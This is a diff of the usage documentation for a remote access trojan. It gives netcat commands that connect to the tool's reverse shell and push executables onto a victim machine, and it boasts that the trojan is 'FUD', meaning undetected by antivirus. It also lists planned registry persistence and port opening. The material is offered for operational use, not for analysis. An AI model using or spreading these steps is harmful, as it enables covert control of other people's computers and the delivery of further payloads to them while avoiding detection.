@@ -35,21 +35,24 @@ Example: ncat 192.168.88.220 8888
 2. Check if reverse shell is working (cd, dir)
 
 3. Put RAT in listenning state by executing:
-RAT upload file -p <path/to/file.exe> -s <size of file (bytes)>
+RAT upload file -p <path/to/file.exe>
 
-Example: RAT upload file -p C:\Users\someuser\checkme\ConsoleApp4.exe -s 4096
+Example: RAT upload file -p C:\Users\someuser\checkme\ConsoleApp4.exe
 
 4. Send file through netcat on main port of your RAT
 
 Example: ncat 192.168.88.230 8888 --send-only < ConsoleApp4.exe
 
 Process:
-![howto-upload](https://user-images.githubusercontent.com/53906830/109667659-a9304a80-7b70-11eb-879b-0230e0567f52.png)
+![rat-upload](https://user-images.githubusercontent.com/53906830/110226904-37029180-7ef3-11eb-897b-8c7db2e9a581.png)
 
 Currently RAT is FUD as it is small and simple, without any specific features.
 
+## Downsides
+High memory usage, because application is self-contained with builded in .NET runtime.
+![rat-memory](https://user-images.githubusercontent.com/53906830/110226932-73ce8880-7ef3-11eb-9f0e-b455832e95b4.png)
+
 TODO/Plans: 
 
-1. Merge JSON configuration into exe file, not to download anything additionally;
-2. Create key in registry for self startup;
-3. Open ports required for communications (for main connection, for file download, etc).
+1. Create key in registry for self startup;
+2. Open ports required for communication;
